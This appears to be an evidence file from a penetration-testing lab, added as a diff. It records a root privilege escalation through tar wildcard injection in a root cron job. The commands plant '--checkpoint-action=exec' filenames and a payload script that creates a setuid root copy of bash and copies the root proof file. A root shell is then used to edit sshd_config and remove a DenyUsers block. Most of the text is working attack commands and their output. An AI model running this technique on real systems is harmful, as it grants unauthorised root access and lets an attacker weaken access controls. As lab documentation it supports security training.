@@ -1,0 +1,128 @@
+================================================================================
+evidence_privesc.txt — tar wildcard injection via root cron
+================================================================================
+
+[1] Local context as cassie
+--------------------------------------------------------------------------------
+$ id
+uid=1000(cassie) gid=1000(cassie) groups=1000(cassie),4(adm),24(cdrom),30(dip),46(plugdev)
+
+$ sudo -l
+Sorry, user cassie may not run sudo on lab-pwk2-student-cl6-157-ubuntu2204-charlie-240-111.
+
+Dead ends checked: /etc/usermin (root:bin 755, not writable), /etc/webmin (absent),
+/var/backups (apt state only).
+
+
+[2] The cron job
+--------------------------------------------------------------------------------
+$ cat /etc/cron.d/2minutes
+*/2 * * * * root cd /opt/admin && tar -zxf /tmp/backup.tar.gz *
+
+$ stat -c '%A %U:%G %n' /opt/admin
+drwxr-xr-x cassie:cassie /opt/admin
+
+$ ls -A /opt/admin
+(no output — empty)
+
+/opt/admin is owned by cassie. The glob `*` is expanded by root inside that directory, so
+cassie controls tar's argv.
+
+
+[3] Sandbox reproduction of the same command shape (uid=0 observed)
+--------------------------------------------------------------------------------
+$ BASE=/tmp/tartest; mkdir -p "$BASE/admin"; cd "$BASE/admin"
+$ cat > pwn.sh <<'EOF'
+#!/bin/sh
+id > /tmp/tartest/EXECUTED.txt
+EOF
+$ chmod +x pwn.sh
+$ touch -- '--checkpoint=1'
+$ touch -- '--checkpoint-action=exec=sh pwn.sh'
+$ ls -b1
+--checkpoint-action=exec=sh\ pwn.sh
+--checkpoint=1
+pwn.sh
+
+$ cd "$BASE/admin" && tar -zxf "$BASE/backup.tar.gz" *
+tar: pwn.sh: Not found in archive
+tar: Exiting with failure status due to previous errors
+
+$ cat "$BASE/EXECUTED.txt"
+uid=0(root) gid=0(root) groups=0(root)
+
+Notes
+- The checkpoint action fired even though backup.tar.gz did not exist.
+- The tar error and non-zero exit are irrelevant: the action had already run.
+- The space inside the second filename survives as one argv entry because pathname
+  expansion is never word-split.
+
+
+[4] On the target — planted payload
+--------------------------------------------------------------------------------
+$ cd /opt/admin
+$ cat > pwn.sh <<'EOF'
+#!/bin/sh
+cp /bin/bash /home/cassie/rootbash
+chmod 4755 /home/cassie/rootbash
+cp /root/proof.txt /home/cassie/proof.txt 2>/dev/null
+chmod 644 /home/cassie/proof.txt 2>/dev/null
+EOF
+$ chmod +x pwn.sh
+$ touch -- '--checkpoint=1'
+$ touch -- '--checkpoint-action=exec=sh pwn.sh'
+$ ls -b1
+--checkpoint-action=exec=sh\ pwn.sh
+--checkpoint=1
+pwn.sh
+
+After the next 2-minute tick:
+
+$ ls -l /home/cassie/rootbash /home/cassie/proof.txt
+-rwsr-xr-x 1 root root ... /home/cassie/rootbash
+-rw-r--r-- 1 root root ... /home/cassie/proof.txt
+
+
+[5] Root
+--------------------------------------------------------------------------------
+cassie@lab-pwk2-student-cl6-157-ubuntu2204-charlie-240-111:~$ /home/cassie/rootbash -p -i
+rootbash-5.1# cat proof.txt
+06fc3530c91d86d66a81d84a116f4eb0
+rootbash-5.1#
+
+proof.txt (as root) = 06fc3530c91d86d66a81d84a116f4eb0
+
+
+[6] Why SSH had been failing — and the fix
+--------------------------------------------------------------------------------
+$ grep -i cassie /var/log/auth.log | tail -n 2
+... sshd[46282]: User cassie from 192.168.45.158 not allowed because listed in DenyUsers
+... sshd[46282]: Connection closed by invalid user cassie 192.168.45.158 port 51234 [preauth]
+
+DenyUsers is evaluated before authentication, so a correct key and a correct password both fail
+with the same generic message. Removal requires root:
+
+$ /home/cassie/rootbash -p -c 'bash /home/cassie/unblock_sshd_7f3a.sh'
+[+] backup: /home/cassie/sshd_config.bak
+[+] removed DenyUsers cassie from /etc/ssh/sshd_config
+[+] sshd -t: config OK
+[+] ssh restarted
+
+Then:
+
+$ ssh -i ~/.ssh/charlie -o IdentitiesOnly=yes cassie@192.168.161.157
+cassie@lab-pwk2-student-cl6-157-ubuntu2204-charlie-240-111:~$
+
+
+[7] Cleanup
+--------------------------------------------------------------------------------
+$ rm -f /opt/admin/--checkpoint=1 '/opt/admin/--checkpoint-action=exec=sh pwn.sh' \
+        /opt/admin/pwn.sh
+$ ls -A /opt/admin
+(no output — empty)
+
+Remove the cron arguments FIRST — otherwise the next tick recreates rootbash and the cleanup
+looks like it failed.
+
+================================================================================
+End of file.
